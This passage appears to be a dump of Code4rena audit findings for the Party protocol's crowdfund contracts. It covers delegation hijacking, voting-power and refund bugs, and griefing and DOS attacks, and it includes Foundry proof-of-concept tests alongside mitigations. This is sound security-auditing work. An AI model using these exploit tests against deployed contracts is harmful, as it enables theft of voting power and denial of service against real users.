[PartyGovernanceNFT.sol#L162](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L162)          _safeMint(owner, tokenId); <- @audit-issue PartyGovernanceNFT#mint utilizes _safeMint  The issue at hand is that ReraiseETHCrowdfund#_contribute and PartyGovernanceNFT#mint use inconsistent minting methods. PartyGovernanceNFT uses safeMint whereas ReraiseETHCrowdfund uses the standard mint. This is problematic because this means that a contract that doesn't implement ERC721Receiver can receive a CrowdfundNFT but they can never claim because safeMint will always revert. This can cause a party to be inadvertently DOS'd because CrowdfundNFTs are soul bound and can't be transferred   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Use _safeMint instead of _mint for ReraiseETHCrowdfund#_contribute"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/41", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-01"], "target": "2023-04-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-04-party-findings/blob/main/data/hansfriese-G.md)."}, {"title": "MaxContribution check can be bypassed to give a card high voting power", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/39", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L295-L298   # Vulnerability details  ## Proof of Concept ReraiseETHCrowdfund tries limit the voting power of each card by doing a min/maxContribution check in claim and claimMultiple. ```             uint96 contribution = (votingPower * 1e4) / exchangeRateBps;             uint96 maxContribution_ = maxContribution;             // Check that the contribution equivalent of total pending voting             // power is not above the max contribution range. This can happen             // for contributors who contributed multiple times In this case, the             // `claimMultiple` function should be called instead. This is done             // so parties may use the minimum and maximum contribution values to             // limit the voting power of each card (e.g.  a party desiring a \"1             // card = 1 vote\"-like governance system where each card has equal             // voting power).             if (contribution > maxContribution_) {                 revert AboveMaximumContributionsError(contribution, maxContribution_);             } ``` https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L270-L282  ```             // Check that the contribution equivalent of voting power is within             // contribution range. This is done so parties may use the minimum             // and maximum contribution values to limit the voting power of each             // card (e.g. a party desiring a \"1 card = 1 vote\"-like governance             // system where each card has equal voting power).             uint96 contribution = (votingPowerByCard[i] * 1e4) / exchangeRateBps;             if (contribution < minContribution_) {                 revert BelowMinimumContributionsError(contribution, minContribution_);             }              if (contribution > maxContribution_) {                 revert AboveMaximumContributionsError(contribution, maxContribution_);             } ``` https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L357-L369   However, this check can be bypassed due to the following code segment ```         else if (party.ownerOf(tokenId) == contributor) {             // Increase voting power of contributor's existing party card.             party.addVotingPower(tokenId, votingPower);         }  ``` https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol#L295-L298  Consider the following situation. Suppose ReraiseETHCrowdfund sets maximumContribution to only allow at most 3 units of voting power in each card. Some user X can contribute the maximum amount twice as 2 different contributor addresses A & B (both of which he controls). When the crowdfund has finalized, X can first call claim as A, then transfer the partyGovernanceNFT from A to B (note that while the crowdfundNFT can't be transferred, the partyGovernanceNFT can be transferred), and finally call claim as B to get a card with 6 units of voting power.  ## Impact The degree of impact really depends on the use case of the party. Some parties would like each card to represent a single vote - this would obviously violate that. Generally, it's not a great idea to allow a single card to hold a high amount of votes, so I'll leave this as a medium for now.  ## Tools Used Manual review  ## Recommended Mitigation Steps One solution is to restrict the maximum voting power on partyGovernanceNFT's side. It can check the votingPower of each card before [adding more votingPower](https://github.com/code-423n4/2023-04-party/blob/main/contracts/party/PartyGovernanceNFT.sol#L169) to it. "}, {"title": "Self-delgated users can have their delegation unknowingly hijacked during crowdfunding", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/38", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L169-L234   # Vulnerability details  ## Impact  Self-delegation can be hijacked  ## Proof of Concept  [PartyGovernance.sol#L886-L906](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L886-L906)      function _adjustVotingPower(address voter, int192 votingPower, address delegate) internal {         VotingPowerSnapshot memory oldSnap = _getLastVotingPowerSnapshotForVoter(voter);         address oldDelegate = delegationsByVoter[voter];         // If `oldDelegate` is zero and `voter` never delegated, then have         // `voter` delegate to themself.         oldDelegate = oldDelegate == address(0) ? voter : oldDelegate;         // If the new `delegate` is zero, use the current (old) delegate.         delegate = delegate == address(0) ? oldDelegate : delegate;          VotingPowerSnapshot memory newSnap = VotingPowerSnapshot({             timestamp: uint40(block.timestamp),             delegatedVotingPower: oldSnap.delegatedVotingPower,             intrinsicVotingPower: (oldSnap.intrinsicVotingPower.safeCastUint96ToInt192() +                 votingPower).safeCastInt192ToUint96(),             isDelegated: delegate != voter         });         _insertVotingPowerSnapshot(voter, newSnap);         delegationsByVoter[voter] = delegate;         // Handle rebalancing delegates.         _rebalanceDelegates(voter, oldDelegate, delegate, oldSnap, newSnap);     }  Self-delegation is triggered when a user specifies their delegate as address(0). This means that if a user wishes to self-delegate they will can contribute to a crowdfund with delegate == address(0).   [ETHCrowdfundBase.sol#L169-L181](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L169-L181)      function _processContribution(         address payable contributor,         address delegate,         uint96 amount     ) internal returns (uint96 votingPower) {         address oldDelegate = delegationsByContributor[contributor];         if (msg.sender == contributor || oldDelegate == address(0)) {             // Update delegate.             delegationsByContributor[contributor] = delegate;         } else {             // Prevent changing another's delegate if already delegated.             delegate = oldDelegate;         }  This method of self-delegation is problematic when combined with _processContribution. When contributing for someone else, the caller is allowed to specify any delegate they wish. If that user is currently self delegated, then the newly specified delegate will overwrite their self delegation. This allows anyone to hijack the voting power of a self-delegated user.   This can create serious issues for ReraiseETHCrowdfund because party NFTs are not minted until after the entire crowdfund is successful. Unlike InitialETHCrowdfund, this allows the attacker to hijack all of the user's newly minted votes.  Example: minContribution = 1 and maxContribution = 100. User A contributes 100 to ReraiseETHCrowdfund. They wish to self-delegate so they call contribute with delegate == address(0). An attacker now contributes 1 on behalf of User A with themselves as the delegate. Now when the NFTs are claimed, they will be delegated to the attacker.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Self-delegation should be automatically hardcoded:      +   if (msg.sender == contributor && delegate == address(0)) {     +       delegationsByContributor[contributor] = contributor;     +   }          address oldDelegate = delegationsByContributor[contributor];         if (msg.sender == contributor || oldDelegate == address(0)) {             // Update delegate.             delegationsByContributor[contributor] = delegate;         } else {             // Prevent changing another's delegate if already delegated.             delegate = oldDelegate;         }"}, {"title": "Contributions can be smaller than minContribution and may receive no voting power", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/37", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L169-L234   # Vulnerability details  ## Impact  Valid contribution is awarded no voting power  ## Proof of Concept  [ETHCrowdfundBase.sol#L195-L219](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L195-L219)          uint96 minContribution_ = minContribution;         if (amount < minContribution_) {             revert BelowMinimumContributionsError(amount, minContribution_);         }         uint96 maxContribution_ = maxContribution;         if (amount > maxContribution_) {             revert AboveMaximumContributionsError(amount, maxContribution_);         }          uint96 newTotalContributions = totalContributions + amount;         uint96 maxTotalContributions_ = maxTotalContributions;         if (newTotalContributions >= maxTotalContributions_) {             totalContributions = maxTotalContributions_;              // Finalize the crowdfund.             // This occurs before refunding excess contribution to act as a             // reentrancy guard.             _finalize(maxTotalContributions_);              // Refund excess contribution.             uint96 refundAmount = newTotalContributions - maxTotalContributions;             if (refundAmount > 0) {                 amount -= refundAmount; <- @audit-issue amount is reduced after min check                 payable(msg.sender).transferEth(refundAmount);             }  When processing a contribution, if the amount contributed would push the crowdfund over the max then it is reduced. This is problematic because this reduction occurs AFTER it checks the amount against the minimum contribution. The result is that these contributions can end up being less than the specified minimum.  Although an edge case, if amount is smaller than exchangeRateBps as it could result in the user receiving no voting power at all for their contribution.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Enforce minContribution after reductions to amount"}, {"title": "ReraiseETHCrowdfund#claimMultiple can be used to grief large depositors", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/35", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-04"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L333-L382   # Vulnerability details  ## Impact  User can be grieved by being force minted a large number of NFTs with low voting power instead of one with high voting power  ## Proof of Concept  [ReraiseETHCrowdfund.sol#L354-L377](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L354-L377)          for (uint256 i; i < votingPowerByCard.length; ++i) {             if (votingPowerByCard[i] == 0) continue;              uint96 contribution = (votingPowerByCard[i] * 1e4) / exchangeRateBps;             if (contribution < minContribution_) {                 revert BelowMinimumContributionsError(contribution, minContribution_);             }              if (contribution > maxContribution_) {                 revert AboveMaximumContributionsError(contribution, maxContribution_);             }              votingPower -= votingPowerByCard[i];              // Mint contributor a new party card.             uint256 tokenId = party.mint(contributor, votingPowerByCard[i], delegate);              emit Claimed(contributor, tokenId, votingPowerByCard[i]);         }  ReraiseETHCrowdfund#claimMultiple can be called by any user for any other user. The above loop uses the user specified `votingPowerByCard` to assign each token a voting power and mint them to the contributor. This is problematic because large contributors can have their voting power fragmented into a large number of NFTs which a small amount of voting power each. The dramatically inflates the gas costs of the affected user.  Example: minContribution = 1 and maxContribution = 100. User A contributes 100. This means they should qualify for one NFT of the largest size. However instead they can be minted 100 NFTs with 1 vote each.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  If msg.sender isn't contributor it should force the user to mint the minimum possible number of NFTs:          uint256 votingPower = pendingVotingPower[contributor];          if (votingPower == 0) return;      +  if (msg.sender != contributor) {     +      require(votingPowerByCard.length == (((votingPower - 1)/maxContribution) + 1));     +  }"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/23", "labels": ["bug", "G (Gas Optimization)", "selected for report", "sponsor confirmed", "G-02"], "target": "2023-04-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-04-party-findings/blob/main/data/HollaDieWaldfee-G.md)."}, {"title": "Possible DOS attack using dust in `ReraiseETHCrowdfund._contribute()`", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/18", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L238   # Vulnerability details  ## Impact Normal contributors wouldn't contribute to the crowdfund properly by a malicious frontrunner.  ## Proof of Concept When users contribute to the `ReraiseETHCrowdfund`, it mints the crowdfund NFT in `_contribute()`.  ```solidity File: 2023-04-party\\contracts\\crowdfund\\ReraiseETHCrowdfund.sol 228:         votingPower = _processContribution(contributor, delegate, amount); 229:  230:         // OK to contribute with zero just to update delegate. 231:         if (amount == 0) return 0; 232:  233:         uint256 previousVotingPower = pendingVotingPower[contributor]; 234:  235:         pendingVotingPower[contributor] += votingPower; 236:  237:         // Mint a crowdfund NFT if this is their first contribution. 238:         if (previousVotingPower == 0) _mint(contributor); //@audit DOS by sending dust ```  As we can see, it mints the NFT when `previousVotingPower == 0` to mint for the first contribution.  But `votingPower` from `_processContribution()` might be 0 even if `amount > 0` and `pendingVotingPower[contributor]` would be remained as 0 after the first contribution.  Then this function will revert from the second contribution as it tries to mint the NFT again.  The below shows the detailed scenario and POC.  1. Let's assume `exchangeRateBps = 5e3`. So [votingPower for 1 wei is zero](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L233). Also, [from the test configurations](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/sol-tests/crowdfund/ReraiseETHCrowdfund.t.sol#L251), it's not a strong condition to assume `minContributions = 0`. 2. After noticing an honest user contributes with 1 ether, an attacker frontruns `contributeFor()` for the honest user with 1 wei. 3. Then the crowdfund NFT of the honest user will be minted but the voting power is still 0. 4. During the honest user's `contribute()`, it will try to mint the NFT again as [previousVotingPower == 0](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L238) and revert. So he can't contribute for this crowdfund.  While executing the POC, [opts.exchangeRateBps](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/sol-tests/crowdfund/ReraiseETHCrowdfund.t.sol#L72) should be `5e3`.  ```solidity     function test_contribute_DOSByFrontrunnerWithDust() public {         ReraiseETHCrowdfund crowdfund = _createCrowdfund({             initialContribution: 0,             initialContributor: payable(address(0)),             initialDelegate: address(0),             minContributions: 0,             maxContributions: type(uint96).max,             disableContributingForExistingCard: false,             minTotalContributions: 3 ether,             maxTotalContributions: 5 ether,             duration: 7 days,             fundingSplitBps: 0,             fundingSplitRecipient: payable(address(0))         });          address attacker = _randomAddress();         address honest = _randomAddress();         vm.deal(attacker, 1); //attacker has 1 wei         vm.deal(honest, 1 ether); //honest user has 1 ether          // Contribute         vm.startPrank(attacker); //attacker frontruns for the honest user         crowdfund.contributeFor{ value: 1 }(payable(honest), honest, \"\");         vm.stopPrank();          assertEq(crowdfund.balanceOf(honest), 1); //crowdfund NFT of the honest users was minted         assertEq(crowdfund.pendingVotingPower(honest), 0); //voting power = 0 because of the low exchangeRateBps          vm.expectRevert(             abi.encodeWithSelector(                 CrowdfundNFT.AlreadyMintedError.selector,                 honest,                 uint256(uint160(honest))             )         );         vm.startPrank(honest); //when the honest user contributes, reverts         crowdfund.contribute{ value: 1 ether }(honest, \"\");         vm.stopPrank();     } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps Recommend minting the crowdfund NFT when the new `votingPower` is positive. Then we can avoid duplicate mints.  ```solidity File: 2023-04-party\\contracts\\crowdfund\\ReraiseETHCrowdfund.sol 233:         uint256 previousVotingPower = pendingVotingPower[contributor]; 234:  235:         pendingVotingPower[contributor] += votingPower; 236:  237:         // Mint a crowdfund NFT if this is their first meaningful contribution. 238:         if (previousVotingPower == 0 && votingPower != 0) _mint(contributor); //++++++++++++++++ ```"}, {"title": "Users wouldn't refund from the lost ETH crowdfunds due to the lack of ETH", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/15", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-03"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L236   # Vulnerability details  ## Impact After the ETH crowdfunds are lost, contributors wouldn't refund their funds because the crowdfunds contract doesn't have enough ETH balance.  ## Proof of Concept The core flaw is `_calculateRefundAmount()` might return more refund amount than the original contribution amount.  ```solidity     function _calculateRefundAmount(uint96 votingPower) internal view returns (uint96 amount) {         amount = (votingPower * 1e4) / exchangeRateBps;          // Add back fee to contribution amount if applicable.         address payable fundingSplitRecipient_ = fundingSplitRecipient;         uint16 fundingSplitBps_ = fundingSplitBps;         if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {             amount = (amount * 1e4) / (1e4 - fundingSplitBps_); //@audit might be greater than original contribution         }     } ```  When users contribute to the ETH crowdfunds, it subtracts the fee from the contribution amount.  ```solidity File: 2023-04-party\\contracts\\crowdfund\\ETHCrowdfundBase.sol 226:         uint16 fundingSplitBps_ = fundingSplitBps; 227:         if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) { 228:             uint96 feeAmount = (amount * fundingSplitBps_) / 1e4; 229:             amount -= feeAmount; 230:         } ```  During the calculation, it calculates `feeAmount` first which is rounded down and subtracts from the contribution amount. It means the final amount after subtracting the fee would be rounded up.  So when we calculate the original amount using `_calculateRefundAmount()`, we might get a greater value.  This shows the detailed example and POC.  1. Let's assume `fundingSplitBps = 1e3(10%), exchangeRateBps = 1e4`.  2. A user contributed `1e18 - 1` wei of ETH. After subtracting the fee, the voting power was `1e18 - 1 - (1e18 - 1) / 10 = 9 * 1e17` 2. Let's assume there are no other contributors and the crowdfund was lost. 3. When the user calls `refund()`, the refund amount will be `9 * 1e17 * 1e4 / 9000 = 1e18` in `_calculateRefundAmount()` 4. So it will try to transfer 1e18 wei of ETH from the crowdfund contract that contains 1e18 - 1 wei only. As a result, the transfer will revert and the user can't refund his funds.  ```solidity     function test_refund_reverts() public {         InitialETHCrowdfund crowdfund = _createCrowdfund({             initialContribution: 0,             initialContributor: payable(address(0)),             initialDelegate: address(0),             minContributions: 0,             maxContributions: type(uint96).max,             disableContributingForExistingCard: false,             minTotalContributions: 3 ether,             maxTotalContributions: 5 ether,             duration: 7 days,             fundingSplitBps: 1000, //10% fee             fundingSplitRecipient: payable(_randomAddress()) //recipient exists         });         Party party = crowdfund.party();          uint256 ethAmount = 1 ether - 1; //contribute amount          address member = _randomAddress();         vm.deal(member, ethAmount);          // Contribute         vm.prank(member);         crowdfund.contribute{ value: ethAmount }(member, \"\");         assertEq(address(member).balance, 0);         assertEq(address(crowdfund).balance, ethAmount); //crowdfund's balance = 1 ether - 1          skip(7 days);          assertTrue(crowdfund.getCrowdfundLifecycle() == ETHCrowdfundBase.CrowdfundLifecycle.Lost);          // Claim refund         vm.prank(member);         uint256 tokenId = 1;         crowdfund.refund(tokenId); //reverts as it tried to withdraw 1 ether     } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps When we subtract the fee in [_processContribution()](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L227), we should calculate the final amount using `1e4 - fundingSplitBps` directly. Then there will be 2 rounds down in `_processContribution()` and `_calculateRefundAmount` and the refund amount won't be greater than the original amount.  ```solidity     if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {         amount = (amount * (1e4 - fundingSplitBps_)) / 1e4;     } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/14", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "edited-by-warden", "Q-04"], "target": "2023-04-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-04-party-findings/blob/main/data/HollaDieWaldfee-Q.md)."}, {"title": "ReraiseETHCrowdfund.sol: party card transfer can be front-run by claiming pending voting power which results in a loss of the voting power", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/12", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-05"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303   # Vulnerability details  ## Impact In this report I show how an attacker can abuse the fact that anyone can call [`ReraiseETHCrowdfund.claim`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303) for any user and add voting power to an existing party card.    The result can be a griefing attack whereby the victim loses voting power. In some cases the attacker can take advantage himself.    In short this is what needs to happen:   1. The victim sends a transaction to transfer one of his party cards 2. The transaction is front-run and pending voting power of the victim from the `ReraiseETHCrowdfund` contract is claimed to this party card that is transferred 3. The victim thereby loses the pending voting power  The fact that any user is at risk that has pending voting power and transfers a party card and that voting power is arguably the most important asset in the protocol makes me estimate this to be \"High\" severity.    ## Proof of Concept We start by observing that when the `ReraiseETHCrowdfund` is won, any user can call `ReraiseETHCrowdfund.claim` for any other user and either mint a new party card to him or add the pending voting power to an existing party card:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L251-L303)   ```solidity /// @notice Claim a party card for a contributor if the crowdfund won. Can be called ///         to claim for self or on another's behalf. /// @param tokenId The ID of the party card to add voting power to. If 0, a ///                new card will be minted. /// @param contributor The contributor to claim for. function claim(uint256 tokenId, address contributor) public {     // Check crowdfund lifecycle.     {         CrowdfundLifecycle lc = getCrowdfundLifecycle();         if (lc != CrowdfundLifecycle.Finalized) {             revert WrongLifecycleError(lc);         }     }       uint96 votingPower = pendingVotingPower[contributor];       if (votingPower == 0) return;       {         uint96 contribution = (votingPower * 1e4) / exchangeRateBps;         uint96 maxContribution_ = maxContribution;         // Check that the contribution equivalent of total pending voting         // power is not above the max contribution range. This can happen         // for contributors who contributed multiple times In this case, the         // `claimMultiple` function should be called instead. This is done         // so parties may use the minimum and maximum contribution values to         // limit the voting power of each card (e.g.  a party desiring a \"1         // card = 1 vote\"-like governance system where each card has equal         // voting power).         if (contribution > maxContribution_) {             revert AboveMaximumContributionsError(contribution, maxContribution_);         }     }       // Burn the crowdfund NFT.     _burn(contributor);       delete pendingVotingPower[contributor];       if (tokenId == 0) {         // Mint contributor a new party card.         tokenId = party.mint(contributor, votingPower, delegationsByContributor[contributor]);     } else if (disableContributingForExistingCard) {         revert ContributingForExistingCardDisabledError();     } else if (party.ownerOf(tokenId) == contributor) {         // Increase voting power of contributor's existing party card.         party.addVotingPower(tokenId, votingPower);     } else {         revert NotOwnerError();     }       emit Claimed(contributor, tokenId, votingPower); } ```  Note that the caller can specify any `contributor` and can add the pending votes to an existing party card if `!disableContributingForExistingCard && party.ownerOf(tokenId) == contributor`.    So if User A has pending voting power and transfers one of his party cards to User B, then User C might front-run this transfer and claim the pending voting power to the party card that is transferred.    If User B performs this attack it is not a griefing attack since User B benefits from it.    Note that at the time of sending the transfer transaction the `ReraiseETHCrowdfund` does not have to be won already. The transaction that does the front-running might contribute to the crowdfund such that it is won and then claim the pending voting power.    Add the following test to the `ReraiseETHCrowdfund.t.sol` test file. It shows how an attacker would perform such an attack:    ```solidity function test_FrontRunTransfer() public {     ReraiseETHCrowdfund crowdfund = _createCrowdfund({         initialContribution: 0,         initialContributor: payable(address(0)),         initialDelegate: address(0),         minContributions: 0,         maxContributions: type(uint96).max,         disableContributingForExistingCard: false,         minTotalContributions: 2 ether,         maxTotalContributions: 3 ether,         duration: 7 days,         fundingSplitBps: 0,         fundingSplitRecipient: payable(address(0))     });      address attacker = _randomAddress();     address victim = _randomAddress();     vm.deal(victim, 2.5 ether);     vm.deal(attacker, 0.5 ether);      // @audit-info the victim owns a party card     vm.prank(address(party));     party.addAuthority(address(this));     party.increaseTotalVotingPower(1 ether);     uint256 victimTokenId = party.mint(victim, 1 ether, address(0));       vm.startPrank(victim);     crowdfund.contribute{ value: 2.5 ether }(victim, \"\");     vm.stopPrank();      /* @audit-info     The victim wants to transfer the party card, say to the attacker, and the attacker     front-runs this by completing the crowdfund and claiming the victim's pending voting     power to the existing party card     */      vm.startPrank(attacker);     crowdfund.contribute{ value: 0.5 ether }(attacker, \"\");     crowdfund.claim(victimTokenId,victim);     vm.stopPrank();      /* @audit-info     when the victim's transfer is executed, he transfers also all of the voting power     that was previously his pending voting power (effectively losing it)     */     vm.prank(victim);     party.tranferFrom(victim,attacker,victimTokenId); } ```  So when there is an ongoing crowdfund it is never safe to transfer one's party card. It can always result in a complete loss of the pending voting power.    ## Tools Used VSCode  ## Recommended Mitigation Steps In the `ReraiseETHCrowdfund.claim` function it should not be possible to add the pending voting power to an existing party card. It is possible though to allow it for the `contributor` himself but not for any user.    ```diff diff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol index 580623d..cb560e1 100644 --- a/contracts/crowdfund/ReraiseETHCrowdfund.sol +++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol @@ -292,7 +292,7 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {              tokenId = party.mint(contributor, votingPower, delegationsByContributor[contributor]);          } else if (disableContributingForExistingCard) {              revert ContributingForExistingCardDisabledError(); -        } else if (party.ownerOf(tokenId) == contributor) { +        } else if (party.ownerOf(tokenId) == contributor && contributor == msg.sender) {              // Increase voting power of contributor's existing party card.              party.addVotingPower(tokenId, votingPower);          } else { ``` "}, {"title": "ETHCrowdfundBase.sol: totalVotingPower is increased too much in the _finalize function", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/11", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-06"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273-L292   # Vulnerability details  ## Impact This issue is about how the [`ETHCrowdfundBase._finalize`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273-L292) functions calls [`PartyGovernanceNFT.increaseTotalVotingPower`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L193-L197) with an amount that does not reflect the sum of the individual users' voting power.    Thereby it will become impossible to reach unanimous votes. In other words and more generally the users' votes are worth less than they should be as the percentage is calculated against a total amount that is too big.    In short, this is how the issue is caused:   1. The voting power that a user receives is based on the amount they contribute MINUS funding fees 2. The amount of voting power by which `totalVotingPower` is increased is based on the total contributions WITHOUT subtracting funding fees  ## Proof of Concept Let's first look at the affected code and then at the PoC.    The `votingPower` that a user receives for making a contribution is calculated in the `ETHCrowdfundBase._processContribution` function.    We can see that first the funding fee is subtracted and then with the lowered `amount`, the `votingPower` is calculated:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L224-L233)   ```solidity // Subtract fee from contribution amount if applicable. address payable fundingSplitRecipient_ = fundingSplitRecipient; uint16 fundingSplitBps_ = fundingSplitBps; if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {     uint96 feeAmount = (amount * fundingSplitBps_) / 1e4;     amount -= feeAmount; }   // Calculate voting power. votingPower = (amount * exchangeRateBps) / 1e4; ```  Even before that, `totalContributions` has been increased by the full `amount` (funding fees have not been subtracted yet):    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L204-L222)   ```solidity uint96 newTotalContributions = totalContributions + amount; uint96 maxTotalContributions_ = maxTotalContributions; if (newTotalContributions >= maxTotalContributions_) {     totalContributions = maxTotalContributions_;       // Finalize the crowdfund.     // This occurs before refunding excess contribution to act as a     // reentrancy guard.     _finalize(maxTotalContributions_);       // Refund excess contribution.     uint96 refundAmount = newTotalContributions - maxTotalContributions;     if (refundAmount > 0) {         amount -= refundAmount;         payable(msg.sender).transferEth(refundAmount);     } } else {     totalContributions = newTotalContributions; } ``` (Note that the above code looks more complicated than it is because it accounts for the fact that `maxTotalContributions` might be reached. But this is not important for explaining this issue)    When `PartyGovernanceNFT.increaseTotalVotingPower` is called it is with the `newVotingPower` that has been calculated BEFORE funding fees are subtracted:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L278-L288)   ```solidity uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4; party.increaseTotalVotingPower(newVotingPower);   // Transfer fee to recipient if applicable. address payable fundingSplitRecipient_ = fundingSplitRecipient; uint16 fundingSplitBps_ = fundingSplitBps; if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {     uint96 feeAmount = (totalContributions_ * fundingSplitBps_) / 1e4;     totalContributions_ -= feeAmount;     fundingSplitRecipient_.transferEth(feeAmount); } ```  Therefore `totalVotingPower` is increased more than the sum of the voting power that the users have received.    Let's look at the PoC:    ```javascript function test_totalVotingPower_increased_too_much() public {         ReraiseETHCrowdfund crowdfund = _createCrowdfund({             initialContribution: 0,             initialContributor: payable(address(0)),             initialDelegate: address(0),             minContributions: 0,             maxContributions: type(uint96).max,             disableContributingForExistingCard: false,             minTotalContributions: 2 ether,             maxTotalContributions: 5 ether,             duration: 7 days,             fundingSplitBps: 1000,             fundingSplitRecipient: payable(address(1))         });          address member1 = _randomAddress();         address member2 = _randomAddress();         vm.deal(member1, 1 ether);    